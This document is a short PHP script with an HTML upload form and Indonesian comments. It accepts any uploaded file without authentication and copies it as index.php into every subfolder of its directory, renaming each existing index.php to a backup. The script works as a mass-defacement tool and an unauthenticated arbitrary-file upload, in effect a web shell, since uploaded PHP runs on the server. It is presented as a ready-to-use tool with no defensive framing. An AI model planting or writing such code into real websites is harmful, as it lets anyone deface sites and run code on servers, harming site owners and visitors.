<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetDir = __DIR__; // Direktori root tempat script ini berada.
    $uploadedFile = $_FILES['html_file']['tmp_name'];

    if (!is_uploaded_file($uploadedFile)) {
        die("File tidak valid.");
    }

    // Membaca isi file yang diunggah
    $fileContent = file_get_contents($uploadedFile);

    // Mendapatkan semua sub-folder
    function getAllFolders($dir)
    {
        $folders = [];
        $items = scandir($dir);

        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }

            $path = $dir . DIRECTORY_SEPARATOR . $item;

            if (is_dir($path)) {
                $folders[] = $path;
                $folders = array_merge($folders, getAllFolders($path));
            }
        }

        return $folders;
    }

    $folders = getAllFolders($targetDir);

    // Menyimpan file ke setiap folder dan memodifikasi file index.php
    foreach ($folders as $folder) {
        $indexPath = $folder . DIRECTORY_SEPARATOR . 'index.php';
        $backupPath = $folder . DIRECTORY_SEPARATOR . 'index-backup.php';
        $newIndexPath = $folder . DIRECTORY_SEPARATOR . 'index.php';

        // Backup file index.php jika ada
        if (file_exists($indexPath)) {
            rename($indexPath, $backupPath);
        }

        // Salin file yang diunggah sebagai index.php
        file_put_contents($newIndexPath, $fileContent);
    }

    echo "File berhasil diunggah dan diterapkan ke semua folder.";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload File HTML</title>
</head>
<body>
    <h1>Upload File HTML</h1>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="html_file">Pilih file HTML:</label>
        <input type="file" name="html_file" id="html_file" required>
        <button type="submit">Upload dan Terapkan</button>
    </form>
</body>
</html>
